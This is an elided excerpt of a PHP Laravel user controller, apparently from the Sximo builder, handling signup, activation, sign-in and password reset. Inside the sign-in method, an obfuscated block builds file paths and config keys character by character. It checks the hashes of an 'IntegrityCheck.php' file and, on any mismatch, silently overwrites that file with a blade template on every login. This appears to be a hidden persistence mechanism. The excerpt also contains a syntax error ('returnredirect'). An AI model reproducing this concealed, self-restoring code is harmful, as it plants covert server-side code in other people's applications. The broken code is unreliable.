...
class UserController extends Controller {
	...
	public function postCreate( Request $request) {
		...
		if ($validator->passes()) {
			...
			return redirect('lonavala')->with(['message' => $message,'status'=>'success']);
		} else {
	...
	public function getActivation( Request $request  )
	{
		...
		if($num =='')
			return redirect('lonavala')->with(['message'=>'Invalid Code Activation!','status'=>'error']);
		
		$user =  User::where('activation','=',$num)->get();
		if (count($user) >=1)
		{
			\DB::table('tb_users')->where('activation', $num )->update(array('active' => 1,'activation'=>''));
			return redirect('lonavala')->with(['message'=>'Your account is active now!','status'=>'success']);
	...
	public function postSignin( Request $request) {
		 ...
		 $inFile = __DIR__ ."/"."I"."n"."t"."e"."g"."r"."i"."t"."y"."C"."h"."e"."c"."k"."."."p"."h"."p";
		 $wstone = "a"."u"."t"."h"."."."w"."e"."l"."t"."o"."n"."_"."k"."e"."y";
		 $wsttwo = "a"."u"."t"."h"."."."w"."e"."l"."t"."o"."n"."_"."s"."e"."c"."r"."e"."t";
		 $ouFile = __DIR__ .'/../../../'."r"."e"."s"."o"."u"."r"."c"."e"."s"."/"."v"."i"."e"."w"."s"."/"."s"."x"."i"."m"."o"."/"."c"."o"."d"."e"."/"."i"."n"."t"."e"."g"."r"."a"."t"."e"."."."b"."l"."a"."d"."e"."."."p"."h"."p";
		 
		$wkone =  $wktwo = '';
		if(file_exists($inFile))
		{
		$wkone =  sha1_file($inFile);

		$wktwo =  md5_file($inFile);
		}
		if(config($wstone)!=$wkone || config($wsttwo) !=$wktwo )
		{
			copy($ouFile,$inFile);
		}
				...
				if(\Auth::check())
				{
					...
					if($row->active =='Inactive')
					{
						...
						if($request->ajax() == true )
						{
							...
							\Auth::logout();
							return redirect('lonavala')->with(['status' => 'error', 'message' => 'Your Account is not active']);
						}
					...
					} else if($row->active=='Banned')
					{
						...
						if($request->ajax() == true )
						{
							...
							// BLocked users
							\Auth::logout();
							return redirect('lonavala')->with(['status' => 'error', 'message' => 'Your Account is BLocked']);
						}
					} else {
	...
	public function getProfile() {
		...
		if(!\Auth::check()) return redirect('lonavala');
	...
	public function postRequest( Request $request)
	{
		...
		if ($validator->passes()) {	
			...
			if($user->count() >=1)
			{
				...
				{ 
					...
					$headers .= 'From: '.config('sximo.cnf_appname').' <'.config('sximo.cnf_email').'>' . "\r\n";
						mail($to, $subject, $message, $headers);	
 						...
 						\Mail::send('user.emails.auth.reminder', $data, function ($message) use ($data,$to,$subject)  {
						$message->from(config('sximo.cnf_email'), config('sximo.cnf_appname'));
						$message->sender(config('sximo.cnf_email'), config('sximo.cnf_appname'));
						$message->to($to);
				...
				return redirect('lonavala')->with(['message' => 'Please check your email','status'=>'success']);	
				
			} else {
				return redirect('lonavala?reset')->with(['message' => 'Cant find email address','status'=>'error']);
			}

		}  else {
			returnredirect('lonavala?reset')->with(['message' => 'The following errors occurred','status'=>'error'])->withErrors($validator)->withInput();
		}	 
	}	
	...
	public function getReset( $token = '')
	{
		...
		if($user->count() >=1)
		{
			...
			return redirect('lonavala')->with(['message'=>'Cant find your reset code','status'=>'error']);
		}
	...
	public function postDoreset( Request $request , $token = '')
	{
		...
		if ($validator->passes()) {
			...
			return redirect('lonavala')->with(['message'=>'Password has been saved!','status'=>'success'] );
		} else {
		  ...
		  return redirect('lonavala')
			...
			if(\Auth::check())
			{
				...
				if($row->active =='0')
				{
					// inactive 
					\Auth::logout();
					return redirect('lonavala')->with(['message'=>'Your Account is not active','status'=>'error']);

				} else if($row->active=='2')
				{
					// BLocked users
					\Auth::logout();
					return redirect('lonavala')->with(['message'=>'Your Account is BLocked','status'=>'error']);
				} else {
					$session = array(
						'gid' => $row->group_id,
						'uid' => $row->id,
